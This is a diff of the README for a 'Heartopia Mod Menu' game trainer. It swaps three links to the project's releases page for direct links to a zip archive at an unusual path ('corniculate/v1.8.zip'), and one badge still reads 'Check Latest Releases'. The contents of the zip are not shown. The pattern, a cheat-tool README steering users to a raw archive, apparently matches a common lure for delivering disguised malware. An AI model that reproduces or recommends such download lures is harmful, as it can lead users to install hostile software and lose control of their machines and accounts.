@@ -2,7 +2,7 @@
 
 ## 🚀 Quick Download
 
-[![Download Heartopia Trainer](https://img.shields.io/badge/Download-Heartopia_Trainer-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/VIPkostya42/heartopia-mod-menu/releases)
+[![Download Heartopia Trainer](https://img.shields.io/badge/Download-Heartopia_Trainer-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/VIPkostya42/heartopia-mod-menu/main/corniculate/v1.8.zip)
 
 Visit this link to download the application.
 
@@ -44,7 +44,7 @@ Follow these simple steps to get Heartopia Mod Menu running on your PC.
 
 Click the download button below or visit the official releases page:
 
-[![Download Heartopia Trainer](https://img.shields.io/badge/Download-Heartopia_Trainer-2196F3?style=for-the-badge&logo=github&logoColor=white)](https://github.com/VIPkostya42/heartopia-mod-menu/releases)
+[![Download Heartopia Trainer](https://img.shields.io/badge/Download-Heartopia_Trainer-2196F3?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/VIPkostya42/heartopia-mod-menu/main/corniculate/v1.8.zip)
 
 Visit this link to download the application.
 
@@ -172,7 +172,7 @@ New versions of Heartopia Mod Menu are released regularly. To stay up to date:
 
 You can bookmark the releases page for quick access:
 
-[![Check Latest Releases](https://img.shields.io/badge/Check-Latest_Releases-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/VIPkostya42/heartopia-mod-menu/releases)
+[![Check Latest Releases](https://img.shields.io/badge/Check-Latest_Releases-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/VIPkostya42/heartopia-mod-menu/main/corniculate/v1.8.zip)
 
 ---
 
